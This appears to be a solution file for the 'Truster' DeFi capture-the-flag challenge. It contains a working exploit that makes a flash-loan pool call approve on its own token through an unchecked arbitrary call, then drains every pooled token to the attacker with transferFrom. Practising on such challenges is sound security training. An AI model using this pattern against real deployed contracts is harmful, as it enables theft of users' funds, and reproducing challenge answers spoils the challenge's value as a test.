const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');

const { expect } = require('chai');

const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider());


describe('[Challenge] Truster', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const TOKENS_IN_POOL = ether('1000000');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal('0');
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        /** trick: 
         * 1. specify target = token.address
         * 2. specify data = approve
         * 3. call flashLoan() with above parameter
         * 4. enjoy!
         * Vulnerability: L27 (call) and L31 (balanceAfter is not guaranteed to be higher than balanceBefore)
         * 
         */
         const data = web3.eth.abi.encodeFunctionCall(
             {
                name: 'approve',
                type: 'function',
                inputs: [{
                    type: 'address',
                    name: 'spender'
                },{
                    type: 'uint256',
                    name: 'amount'
                }]
             }
            , [attacker, TOKENS_IN_POOL.toString()]);
         await this.pool.flashLoan(0, attacker, this.token.address, data)
         await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });


    });

    after(async function () {
        /** SUCCESS CONDITIONS  */
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal('0');
        
    });
});
